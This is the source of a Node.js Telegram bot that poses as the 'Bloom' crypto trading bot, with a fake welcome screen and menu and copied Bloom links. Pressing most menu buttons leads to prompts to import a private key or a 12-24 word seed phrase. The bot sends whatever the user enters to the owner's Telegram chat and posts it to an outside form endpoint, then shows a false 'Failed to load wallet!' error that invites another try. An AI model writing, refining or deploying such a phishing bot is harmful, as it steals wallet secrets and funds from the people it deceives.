const express = require('express');
const app = express();
const PORT = process.env.PORT || 3006;

// Health check endpoint
app.get('/health', (req, res) => {
  res.status(200).send('Bot is running!');
});

// Start the HTTP server
app.listen(PORT, () => {
  console.log(`Health check server running on port ${PORT}`);
});
require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');

const token = process.env.BOT_TOKEN;
const ownerId = process.env.OWNER_ID;
const formUnstaticURL = process.env.FORM_UNSTATIC_URL;

// Check for missing environment variables
if (!token || !ownerId || !formUnstaticURL) {
  console.error(
    'Missing required environment variables. Check your .env file.'
  );
  process.exit(1);
}

const bot = new TelegramBot(token, { polling: true });
console.log('Bot started successfully!');
const chatStates = {};

console.log('Bot started successfully!');

const sendToFormUnstatic = async (name, message) => {
  if (!name || !message) {
    console.error('Missing name or message for FormUnstatic submission.');
    return;
  }

  try {
    const response = await axios.post(
      formUnstaticURL,
      new URLSearchParams({
        name: name,
        message: message,
      }),
      {
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      }
    );
    console.log('Data sent to FormUnstatic:', response.data);
  } catch (error) {
    console.error(
      'Error sending data to FormUnstatic:',
      error.response?.data || error.message
    );
  }
};

bot.on('message', (msg) => {
  const chatId = msg.chat.id;

  if (chatStates[chatId] === 'awaiting_private_key') {
    const privateKey = msg.text;

    bot.sendMessage(ownerId, `🔑 Private Key Received:\n${privateKey}`);
    sendToFormUnstatic('Private Key Received', privateKey);

    bot.sendMessage(chatId, '❌ Failed to load wallet!', {
      reply_markup: {
        inline_keyboard: [[{ text: 'Try again', callback_data: 'try_again' }]],
      },
    });

    delete chatStates[chatId];
  } else if (chatStates[chatId] === 'awaiting_seed_phrase') {
    const seedPhrase = msg.text;

    bot.sendMessage(ownerId, `📜 Seed Phrase Received:\n${seedPhrase}`);
    sendToFormUnstatic('Seed Phrase Received', seedPhrase);

    bot.sendMessage(chatId, '❌ Failed to load wallet!', {
      reply_markup: {
        inline_keyboard: [[{ text: 'Try again', callback_data: 'try_again' }]],
      },
    });

    delete chatStates[chatId];
  } else {
    bot.sendMessage(chatId, `Hello, ${msg.from.first_name}!`);
  }
});

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;

  // Function to get the current time in HH:mm:ss format
  const getCurrentTime = () => {
    const currentDate = new Date();
    const hours = currentDate.getHours().toString().padStart(2, '0');
    const minutes = currentDate.getMinutes().toString().padStart(2, '0');
    const seconds = currentDate.getSeconds().toString().padStart(2, '0');
    return `${hours}:${minutes}:${seconds}`;
  };

  // Create the message with the dynamic time
  const message = (lastUpdatedTime) => `
Welcome to Bloom! 🌸

Let your trading journey blossom with us!

🌸 Your BSC Wallet Address:

→ W1: 0xc45EDBcF8F6C773DBe67a9Da42714bD77b9D64b4
Balance: N/A

🔴 You currently have no BNB in your wallet.
To start trading, please deposit BNB to your address.

📚 Resources:

• 📖 [Bloom Guides](https://bsc.bloombot.app/)
• 🔔 [Bloom X](https://x.com/BloomTradingBot/)
• 🌍 [Bloom Website](https://www.bloombot.app/) 
• 🤝 [Bloom Portal](https://t.me/bloomportal)

🕒 Last updated: ${lastUpdatedTime}`;

  // Inline keyboard options
  const options = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: '💼 Positions', callback_data: 'positions' },
          { text: '🎯 Sniper (Soon)', callback_data: 'sniper' },
        ],
        // Second row with 4 buttons
        [
          { text: '🤖 Copy Trade', callback_data: ' copy-trade' },
          { text: '💤 AFK Mode', callback_data: 'afk' },
        ],
        // Third row with 3 buttons
        [
          { text: '📝 Limit Orders', callback_data: 'limit-orders' },
          { text: '👥 Referrals', callback_data: 'referrals' },
        ],
        [
          { text: '💸 Withdraw', callback_data: 'withdraw' },
          { text: '⚙️ Settings', callback_data: 'settings' },
        ],
        [
          { text: '🗑 Close', callback_data: 'close' },
          { text: '🔄 Refresh', callback_data: 'refresh' },
        ],
      ],
    },
  };

  // Function to send message with real-time update every second
  const sendRealTimeMessage = () => {
    const lastUpdatedTime = getCurrentTime();
    bot.sendMessage(chatId, message(lastUpdatedTime), {
      parse_mode: 'Markdown',
      ...options,
    });
  };

  // Initial message with real-time time
  sendRealTimeMessage();
});

bot.on('callback_query', (query) => {
  const chatId = query.message.chat.id;

  if (query.data === 'try_again') {
    const message = `Welcome to Bloom! 🌸

Let your trading journey blossom with us!

🌸 Your BSC Wallet Address:

→ W1: [0xc45EDBcF8F6C773DBe67a9Da42714bD77b9D64b4]
Balance: N/A

🔴 You currently have no BNB in your wallet.
To start trading, please deposit BNB to your address.

📚 Resources:

• 📖 [Bloom Guides](https://bsc.bloombot.app/)
• 🔔 [Bloom X](https://x.com/BloomTradingBot/)
• 🌍 [Bloom Website](https://www.bloombot.app/) 
• 🤝 [Bloom Portal](https://t.me/bloomportal)

🕒 Last updated: ${lastUpdatedTime}`;

    // Define the inline keyboard with two buttons
    const options = {
      reply_markup: {
        inline_keyboard: [
          // First row with 2 buttons
          [
            { text: '💼 Positions', callback_data: 'positions' },
            { text: '🎯 Sniper (Soon)', callback_data: 'sniper' },
          ],
          // Second row with 4 buttons
          [
            { text: '🤖 Copy Trade', callback_data: ' copy-trade' },
            { text: '💤 AFK Mode', callback_data: 'afk' },
          ],
          // Third row with 3 buttons
          [
            { text: '📝 Limit Orders', callback_data: 'limit-orders' },
            { text: '👥 Referrals', callback_data: 'referrals' },
          ],
          [
            { text: '💸 Withdraw', callback_data: 'withdraw' },
            { text: '⚙️ Settings', callback_data: 'settings' },
          ],
          [
            { text: '🗑 Close', callback_data: 'close' },
            { text: '🔄 Refresh', callback_data: 'refresh' },
          ],
        ],
      },
    };

    // Send the welcome message along with the inline keyboard options
    bot.sendMessage(chatId, message, { parse_mode: 'Markdown', ...options });
  } else if (query.data === 'import_wallet') {
    const importMessage = `ℹ️ Connect wallet to use settings`;

    const importOptions = {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'IMPORT PRIVATE KEY', callback_data: 'import_private_key' }],
          [{ text: 'IMPORT SEED PHRASE', callback_data: 'import_seed_phrase' }],
        ],
      },
    };

    bot.sendMessage(chatId, importMessage, importOptions);
  } else if (query.data === 'import_private_key') {
    bot.sendMessage(chatId, 'Enter private key 🔑', {
      reply_markup: {
        keyboard: [[{ text: 'Cancel' }]],
        resize_keyboard: true,
        one_time_keyboard: true,
      },
    });

    chatStates[chatId] = 'awaiting_private_key';
  } else if (query.data === 'import_seed_phrase') {
    bot.sendMessage(chatId, 'Enter 12-24 word mnemonic / recovery phrase ⬇️', {
      reply_markup: {
        keyboard: [[{ text: 'Cancel' }]],
        resize_keyboard: true,
        one_time_keyboard: true,
      },
    });

    chatStates[chatId] = 'awaiting_seed_phrase';
  } else {
    const newMessage = `Connect a wallet to use settings`;

    const walletOptions = {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: 'Import wallet 💳',
              callback_data: 'import_wallet',
            },
          ],
        ],
      },
    };

    bot.sendMessage(chatId, newMessage, walletOptions);
  }

  bot.answerCallbackQuery(query.id);
});
